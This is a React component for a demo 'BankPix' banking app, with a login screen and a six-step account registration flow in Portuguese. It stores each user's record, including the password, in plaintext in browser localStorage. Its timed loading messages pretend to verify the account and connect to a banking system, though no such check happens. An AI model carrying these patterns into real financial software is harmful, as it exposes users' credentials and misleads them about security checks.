'use client'

import { useState, useEffect, useRef } from 'react'
import { ArrowRight, ArrowLeft, Phone, User, Lock, CheckCircle, Wallet, Calendar, BarChart3, MapPin, Eye, EyeOff } from 'lucide-react'
import { formatPhoneInput, validatePhone, validatePassword } from '@/lib/store'

export function LoginScreen({ onLogin }: { onLogin: (userData: any) => void }) {
  const [mode, setMode] = useState<'login' | 'register'>('login')
  const [step, setStep] = useState(1)
  const [isProcessing, setIsProcessing] = useState(false)
  const [preLinkLoading, setPreLinkLoading] = useState(false)
  const [finalLoading, setFinalLoading] = useState(false)
  const [loadingMessage, setLoadingMessage] = useState('')

  // Form States
  const [name, setName] = useState('')
  const [phone, setPhone] = useState('')
  const [password, setPassword] = useState('')
  const [confirmPassword, setConfirmPassword] = useState('')
  const [province, setProvince] = useState('')
  const [birthDate, setBirthDate] = useState('')
  const [dailyLimit, setDailyLimit] = useState('')
  const [showPass, setShowPass] = useState(false)

  const totalSteps = 6 // Reduzido pois unimos a senha

  // Função para processamento entre etapas
  const nextStep = async () => {
    setIsProcessing(true)
    await new Promise(r => setTimeout(r, 2000))
    setIsProcessing(false)
    setStep(s => s + 1)
  }

  // Fluxo final de abertura de conta
  const handleFinalRegister = async () => {
    if (password !== confirmPassword) {
      alert("As senhas não coincidem!");
      return;
    }

    // Tela Azul Escuro: Conectando (7 segundos)
    setPreLinkLoading(true)
    await new Promise(r => setTimeout(r, 7000))
    setPreLinkLoading(false)

    // Sequência final de mensagens (Tempo aumentado em +4s no total)
    setFinalLoading(true)
    const messages = [
      'Verificando seu cadastro...',
      'Preparando seu Pix...',
      'Conectando ao sistema Brasil...',
      'Só mais um momento...',
      'Não feche a tela...'
    ]

    for (const msg of messages) {
      setLoadingMessage(msg)
      await new Promise(r => setTimeout(r, 3500)) // Aumentado para ~17.5s total
    }

    const userData = { name, phone, password, province, birthDate, dailyLimit, balance: 0, income: 0, keys: [], transactions: [] }
    localStorage.setItem(`bankpix_user_${phone}`, JSON.stringify(userData))
    setStep(7) 
    setFinalLoading(false)
  }

  // --- RENDERS DE CARREGAMENTO ---

  if (preLinkLoading) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center bg-[#001a33] p-6 transition-all duration-500">
        <div className="w-16 h-16 border-4 border-white/20 border-t-white rounded-full animate-spin mb-6"></div>
        <h1 className="text-2xl font-bold text-white animate-pulse">CONECTANDO...</h1>
      </div>
    )
  }

  if (finalLoading) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center bg-white p-6 text-center">
        <div className="w-20 h-20 border-8 border-gray-100 border-t-primary rounded-full animate-spin mb-8"></div>
        <h1 className="text-2xl font-black text-gray-900 animate-pulse uppercase tracking-tight">{loadingMessage}</h1>
      </div>
    )
  }

  // --- COMPONENTE DE PASSO (ESTABILIZADO PARA NÃO PERDER FOCO) ---

  const renderStepContent = () => {
    if (isProcessing) {
      return (
        <div className="flex flex-col items-center py-10 space-y-4">
          <div className="w-10 h-10 border-4 border-primary/20 border-t-primary rounded-full animate-spin"></div>
          <p className="text-sm font-bold text-gray-400 uppercase tracking-widest">Validando...</p>
        </div>
      )
    }

    switch (step) {
      case 1:
        return (
          <div className="space-y-6">
            <input 
              autoFocus
              className="w-full p-4 bg-gray-100 border-2 border-gray-200 rounded-2xl text-black font-extrabold text-xl outline-none focus:border-primary"
              value={name} onChange={e => setName(e.target.value)} placeholder="Nome e Sobrenome"
            />
            <button onClick={nextStep} className="w-full py-4 bg-primary text-white rounded-2xl font-black text-lg shadow-lg flex items-center justify-center gap-2">PRÓXIMO <ArrowRight size={20} /></button>
          </div>
        )
      case 2:
        return (
          <div className="space-y-6">
            <input 
              type="date"
              className="w-full p-4 bg-gray-100 border-2 border-gray-200 rounded-2xl text-black font-extrabold text-xl outline-none focus:border-primary"
              value={birthDate} onChange={e => setBirthDate(e.target.value)}
            />
            <button onClick={nextStep} className="w-full py-4 bg-primary text-white rounded-2xl font-black text-lg shadow-lg flex items-center justify-center gap-2">PRÓXIMO <ArrowRight size={20} /></button>
          </div>
        )
      case 3:
        return (
          <div className="space-y-6">
            <select 
              className="w-full p-4 bg-gray-100 border-2 border-gray-200 rounded-2xl text-black font-extrabold text-xl outline-none focus:border-primary appearance-none"
              value={province} onChange={e => setProvince(e.target.value)}
            >
              <option value="">Selecione a Província</option>
              <option value="Zambézia">Zambézia</option>
              <option value="Maputo">Maputo</option>
              <option value="Sofala">Sofala</option>
              <option value="Nampula">Nampula</option>
              <option value="Tete">Tete</option>
            </select>
            <button onClick={nextStep} className="w-full py-4 bg-primary text-white rounded-2xl font-black text-lg shadow-lg flex items-center justify-center gap-2">PRÓXIMO <ArrowRight size={20} /></button>
          </div>
        )
      case 4:
        return (
          <div className="space-y-6">
            <input 
              type="tel"
              className="w-full p-4 bg-gray-100 border-2 border-gray-200 rounded-2xl text-black font-extrabold text-xl outline-none focus:border-primary"
              value={phone} onChange={e => setPhone(e.target.value)} placeholder="Ex: 84XXXXXXX"
            />
            <button onClick={nextStep} className="w-full py-4 bg-primary text-white rounded-2xl font-black text-lg shadow-lg flex items-center justify-center gap-2">PRÓXIMO <ArrowRight size={20} /></button>
          </div>
        )
      case 5:
        return (
          <div className="space-y-6">
            <select 
              className="w-full p-4 bg-gray-100 border-2 border-gray-200 rounded-2xl text-black font-extrabold text-xl outline-none focus:border-primary appearance-none"
              value={dailyLimit} onChange={e => setDailyLimit(e.target.value)}
            >
              <option value="">Qual o Limite de Movimento</option>
              <option value="1000">Até R$ 1.000,00 </option>
              <option value="5000"> R$ 1.000 a 5.000 </option>
              <option value="10000">Mais de R$5.000 </option>
            </select>
            <button onClick={nextStep} className="w-full py-4 bg-primary text-white rounded-2xl font-black text-lg shadow-lg flex items-center justify-center gap-2">PRÓXIMO <ArrowRight size={20} /></button>
          </div>
        )
      case 6:
        return (
          <div className="space-y-4">
            <div className="relative">
              <input 
                type={showPass ? 'text' : 'password'}
                className="w-full p-4 bg-gray-100 border-2 border-gray-200 rounded-2xl text-black font-extrabold text-xl outline-none focus:border-primary"
                value={password} onChange={e => setPassword(e.target.value)} placeholder="Nova Senha"
              />
              <button type="button" onClick={() => setShowPass(!showPass)} className="absolute right-4 top-5 text-gray-400">
                {showPass ? <EyeOff size={24}/> : <Eye size={24}/>}
              </button>
            </div>
            <input 
              type={showPass ? 'text' : 'password'}
              className="w-full p-4 bg-gray-100 border-2 border-gray-200 rounded-2xl text-black font-extrabold text-xl outline-none focus:border-primary"
              value={confirmPassword} onChange={e => setConfirmPassword(e.target.value)} placeholder="Confirmar Senha"
            />
            <button onClick={handleFinalRegister} className="w-full py-5 bg-primary text-white rounded-2xl font-black text-xl shadow-xl mt-4">ABRIR CONTA AGORA</button>
          </div>
        )
      case 7:
        return (
          <div className="flex flex-col items-center animate-in zoom-in duration-500">
            <CheckCircle className="w-20 h-20 text-green-500 mb-6" />
            <h1 className="text-3xl font-black text-gray-900 mb-2">SUCESSO!</h1>
            <p className="text-xl font-bold text-gray-500 mb-8">Conta ativa para <span className="text-primary">{name.split(' ')[0]}</span></p>
            <button 
              onClick={() => onLogin(JSON.parse(localStorage.getItem(`bankpix_user_${phone}`)!))}
              className="w-full py-5 bg-primary text-white rounded-2xl font-black text-xl"
            >
              ENTRAR NO BANKPIX
            </button>
          </div>
        )
      default:
        return null
    }
  }

  if (mode === 'login') {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50 p-4">
        <div className="w-full max-w-md bg-white rounded-[40px] shadow-2xl p-10 border border-gray-100">
          <div className="flex flex-col items-center mb-10">
            <div className="p-4 bg-primary/10 rounded-3xl mb-4"><Wallet className="w-12 h-12 text-primary" /></div>
            <h1 className="text-4xl font-black text-gray-900">Bank<span className="text-primary">Pix</span></h1>
          </div>
          <div className="space-y-4">
            <input type="tel" placeholder="Telefone" className="w-full p-5 bg-gray-100 rounded-2xl text-black font-bold outline-none" onChange={e => setPhone(e.target.value)} />
            <input type="password" placeholder="Senha" className="w-full p-5 bg-gray-100 rounded-2xl text-black font-bold outline-none" onChange={e => setPassword(e.target.value)} />
            <button onClick={() => setMode('register')} className="w-full py-5 bg-primary text-white rounded-2xl font-black text-xl shadow-lg shadow-primary/30">ENTRAR</button>
            <button onClick={() => setMode('register')} className="w-full text-center text-sm font-bold text-gray-400 mt-4 uppercase">Criar Nova Conta</button>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-50 p-4">
      <div className="w-full max-w-md bg-white rounded-[40px] shadow-2xl p-10 border border-gray-100 relative overflow-hidden">
        {step < 7 && (
          <div className="flex justify-between items-center mb-8">
            <div className="bg-primary/10 text-primary text-xs font-black px-4 py-2 rounded-full uppercase tracking-widest">Passo {step} de {totalSteps}</div>
            {step > 1 && <button onClick={() => setStep(step - 1)} className="text-gray-300 hover:text-gray-600 transition-colors"><ArrowLeft size={24}/></button>}
          </div>
        )}
        {renderStepContent()}
      </div>
    </div>
  )
}
